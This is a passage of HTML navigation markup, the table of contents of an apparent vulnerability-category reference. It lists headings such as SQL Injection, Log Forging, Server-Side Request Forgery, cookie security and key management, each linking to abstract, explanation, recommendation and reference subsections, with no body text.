class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-27"><span class="toc-number">1.4.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-27"><span class="toc-number">1.4.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-27"><span class="toc-number">1.4.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-27"><span class="toc-number">1.4.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Script-Injection"><span class="toc-number">1.4.12.</span> <span class="toc-text">Dynamic Code Evaluation: Script Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-28"><span class="toc-number">1.4.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-28"><span class="toc-number">1.4.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-28"><span class="toc-number">1.4.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-28"><span class="toc-number">1.4.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Dynamic-Code-Evaluation-Unsafe-YAML-Deserialization"><span class="toc-number">1.4.13.</span> <span class="toc-text">Dynamic Code Evaluation: Unsafe YAML Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-29"><span class="toc-number">1.4.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-29"><span class="toc-number">1.4.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-29"><span class="toc-number">1.4.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-29"><span class="toc-number">1.4.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTML5-Cross-Site-Scripting-Protection"><span class="toc-number">1.4.14.</span> <span class="toc-text">HTML5: Cross-Site Scripting Protection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-30"><span class="toc-number">1.4.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-30"><span class="toc-number">1.4.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-30"><span class="toc-number">1.4.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-30"><span class="toc-number">1.4.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Header-Manipulation"><span class="toc-number">1.4.15.</span> <span class="toc-text">Header Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-31"><span class="toc-number">1.4.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-31"><span class="toc-number">1.4.15.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-31"><span class="toc-number">1.4.15.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-31"><span class="toc-number">1.4.15.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Header-Manipulation-Cookies"><span class="toc-number">1.4.16.</span> <span class="toc-text">Header Manipulation: Cookies</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-32"><span class="toc-number">1.4.16.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-32"><span class="toc-number">1.4.16.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-32"><span class="toc-number">1.4.16.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-32"><span class="toc-number">1.4.16.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JSON-Injection"><span class="toc-number">1.4.17.</span> <span class="toc-text">JSON Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-33"><span class="toc-number">1.4.17.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-33"><span class="toc-number">1.4.17.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-33"><span class="toc-number">1.4.17.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-33"><span class="toc-number">1.4.17.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Log-Forging"><span class="toc-number">1.4.18.</span> <span class="toc-text">Log Forging</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-34"><span class="toc-number">1.4.18.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-34"><span class="toc-number">1.4.18.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-34"><span class="toc-number">1.4.18.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-34"><span class="toc-number">1.4.18.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Log-Forging-debug"><span class="toc-number">1.4.19.</span> <span class="toc-text">Log Forging (debug)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-35"><span class="toc-number">1.4.19.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-35"><span class="toc-number">1.4.19.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-35"><span class="toc-number">1.4.19.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-35"><span class="toc-number">1.4.19.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Open-Redirect"><span class="toc-number">1.4.20.</span> <span class="toc-text">Open Redirect</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-36"><span class="toc-number">1.4.20.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-36"><span class="toc-number">1.4.20.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-36"><span class="toc-number">1.4.20.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-36"><span class="toc-number">1.4.20.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Path-Manipulation"><span class="toc-number">1.4.21.</span> <span class="toc-text">Path Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-37"><span class="toc-number">1.4.21.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-37"><span class="toc-number">1.4.21.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-37"><span class="toc-number">1.4.21.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-37"><span class="toc-number">1.4.21.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Path-Manipulation-Zip-Entry-Overwrite"><span class="toc-number">1.4.22.</span> <span class="toc-text">Path Manipulation: Zip Entry Overwrite</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-38"><span class="toc-number">1.4.22.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-38"><span class="toc-number">1.4.22.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-38"><span class="toc-number">1.4.22.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-38"><span class="toc-number">1.4.22.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Process-Control"><span class="toc-number">1.4.23.</span> <span class="toc-text">Process Control</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-39"><span class="toc-number">1.4.23.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-39"><span class="toc-number">1.4.23.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-39"><span class="toc-number">1.4.23.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-39"><span class="toc-number">1.4.23.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Resource-Injection"><span class="toc-number">1.4.24.</span> <span class="toc-text">Resource Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-40"><span class="toc-number">1.4.24.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-40"><span class="toc-number">1.4.24.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-40"><span class="toc-number">1.4.24.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-40"><span class="toc-number">1.4.24.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">1.4.25.</span> <span class="toc-text">SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-41"><span class="toc-number">1.4.25.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-41"><span class="toc-number">1.4.25.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-41"><span class="toc-number">1.4.25.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-41"><span class="toc-number">1.4.25.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Server-Side-Request-Forgery"><span class="toc-number">1.4.26.</span> <span class="toc-text">Server-Side Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-42"><span class="toc-number">1.4.26.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-42"><span class="toc-number">1.4.26.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-42"><span class="toc-number">1.4.26.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-42"><span class="toc-number">1.4.26.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Server-Side-Template-Injection"><span class="toc-number">1.4.27.</span> <span class="toc-text">Server-Side Template Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-43"><span class="toc-number">1.4.27.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-43"><span class="toc-number">1.4.27.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-43"><span class="toc-number">1.4.27.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-43"><span class="toc-number">1.4.27.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Setting-Manipulation"><span class="toc-number">1.4.28.</span> <span class="toc-text">Setting Manipulation</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-44"><span class="toc-number">1.4.28.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-44"><span class="toc-number">1.4.28.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-44"><span class="toc-number">1.4.28.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Setting-Manipulation-User-Controlled-Expression-Delimiters"><span class="toc-number">1.4.29.</span> <span class="toc-text">Setting Manipulation: User-Controlled Expression Delimiters</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-45"><span class="toc-number">1.4.29.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-45"><span class="toc-number">1.4.29.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-45"><span class="toc-number">1.4.29.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-44"><span class="toc-number">1.4.29.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Setting-Manipulation-User-Controlled-Whitelist"><span class="toc-number">1.4.30.</span> <span class="toc-text">Setting Manipulation: User-Controlled Whitelist</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-46"><span class="toc-number">1.4.30.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-46"><span class="toc-number">1.4.30.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-46"><span class="toc-number">1.4.30.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-45"><span class="toc-number">1.4.30.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML-Injection"><span class="toc-number">1.4.31.</span> <span class="toc-text">XML Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-47"><span class="toc-number">1.4.31.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-47"><span class="toc-number">1.4.31.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-47"><span class="toc-number">1.4.31.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-46"><span class="toc-number">1.4.31.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#安全特性"><span class="toc-number">1.5.</span> <span class="toc-text">安全特性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Access-Control-Azure"><span class="toc-number">1.5.1.</span> <span class="toc-text">Access Control: Azure</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-48"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-48"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-48"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-47"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Access-Control-Database"><span class="toc-number">1.5.2.</span> <span class="toc-text">Access Control: Database</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-49"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-49"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-49"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-48"><span class="toc-number">1.5.2.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AngularJS-Misconfiguration-Dangerous-Protocol-Allowed"><span class="toc-number">1.5.3.</span> <span class="toc-text">AngularJS Misconfiguration: Dangerous Protocol Allowed</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-50"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-50"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-50"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-49"><span class="toc-number">1.5.3.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AngularJS-Misconfiguration-Strict-Contextual-Escaping-Disabled"><span class="toc-number">1.5.4.</span> <span class="toc-text">AngularJS Misconfiguration: Strict Contextual Escaping Disabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-51"><span class="toc-number">1.5.4.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-51"><span class="toc-number">1.5.4.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-51"><span class="toc-number">1.5.4.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-50"><span class="toc-number">1.5.4.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie-Security-Cookie-not-Sent-Over-SSL"><span class="toc-number">1.5.5.</span> <span class="toc-text">Cookie Security: Cookie not Sent Over SSL</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-52"><span class="toc-number">1.5.5.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-52"><span class="toc-number">1.5.5.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-52"><span class="toc-number">1.5.5.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-51"><span class="toc-number">1.5.5.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie-Security-HTTPOnly-not-Set"><span class="toc-number">1.5.6.</span> <span class="toc-text">Cookie Security: HTTPOnly not Set</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-53"><span class="toc-number">1.5.6.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-53"><span class="toc-number">1.5.6.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-53"><span class="toc-number">1.5.6.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-52"><span class="toc-number">1.5.6.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie-Security-Overly-Broad-Domain"><span class="toc-number">1.5.7.</span> <span class="toc-text">Cookie Security: Overly Broad Domain</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-54"><span class="toc-number">1.5.7.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-54"><span class="toc-number">1.5.7.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-54"><span class="toc-number">1.5.7.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-53"><span class="toc-number">1.5.7.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Cookie-Security-Overly-Broad-Path"><span class="toc-number">1.5.8.</span> <span class="toc-text">Cookie Security: Overly Broad Path</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-55"><span class="toc-number">1.5.8.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-55"><span class="toc-number">1.5.8.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-55"><span class="toc-number">1.5.8.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-54"><span class="toc-number">1.5.8.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Randomness"><span class="toc-number">1.5.9.</span> <span class="toc-text">Insecure Randomness</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-56"><span class="toc-number">1.5.9.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-56"><span class="toc-number">1.5.9.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-56"><span class="toc-number">1.5.9.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-55"><span class="toc-number">1.5.9.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-SSL-Server-Identity-Verification-Disabled"><span class="toc-number">1.5.10.</span> <span class="toc-text">Insecure SSL: Server Identity Verification Disabled</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-57"><span class="toc-number">1.5.10.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-57"><span class="toc-number">1.5.10.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-57"><span class="toc-number">1.5.10.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-56"><span class="toc-number">1.5.10.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Transport"><span class="toc-number">1.5.11.</span> <span class="toc-text">Insecure Transport</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-58"><span class="toc-number">1.5.11.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-58"><span class="toc-number">1.5.11.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-58"><span class="toc-number">1.5.11.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-57"><span class="toc-number">1.5.11.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Transport-HSTS-not-Set"><span class="toc-number">1.5.12.</span> <span class="toc-text">Insecure Transport: HSTS not Set</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-59"><span class="toc-number">1.5.12.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-59"><span class="toc-number">1.5.12.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-59"><span class="toc-number">1.5.12.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-58"><span class="toc-number">1.5.12.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Insecure-Transport-Weak-SSL-Protocol"><span class="toc-number">1.5.13.</span> <span class="toc-text">Insecure Transport: Weak SSL Protocol</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-60"><span class="toc-number">1.5.13.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-60"><span class="toc-number">1.5.13.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-60"><span class="toc-number">1.5.13.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-59"><span class="toc-number">1.5.13.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Key-Management-Empty-Encryption-Key"><span class="toc-number">1.5.14.</span> <span class="toc-text">Key Management: Empty Encryption Key</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-61"><span class="toc-number">1.5.14.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-61"><span class="toc-number">1.5.14.2.</span> <span class="toc-text">EXPLANATION</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#RECOMMENDATIONS-61"><span class="toc-number">1.5.14.3.</span> <span class="toc-text">RECOMMENDATIONS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#REFERENCES-60"><span class="toc-number">1.5.14.4.</span> <span class="toc-text">REFERENCES</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Key-Management-Hardcoded-Encryption-Key"><span class="toc-number">1.5.15.</span> <span class="toc-text">Key Management: Hardcoded Encryption Key</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ABSTRACT-62"><span class="toc-number">1.5.15.1.</span> <span class="toc-text">ABSTRACT</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#EXPLANATION-62"><span 